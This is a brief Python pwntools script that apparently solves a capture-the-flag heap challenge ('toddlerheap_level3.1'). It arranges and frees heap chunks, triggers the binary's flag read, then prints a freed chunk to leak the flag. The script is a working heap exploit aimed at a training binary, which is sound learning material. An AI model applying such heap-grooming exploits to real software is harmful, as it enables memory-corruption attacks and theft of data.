from pwn import *
#0x360
#0x360 * 2 - 0x10

context.arch = 'amd64'
BINARY = "/challenge/toddlerheap_level3.1"
p = process(BINARY)

for i in range(4):
    p.sendline(f'malloc {i} 1712')
p.sendline(f'malloc 4 2576')
p.sendline(f'malloc 5 1712')

for i in range(6):
    p.sendline(f"free {i}")

p.sendline(b"read_flag")
p.sendline(b"puts 5")
p.interactive()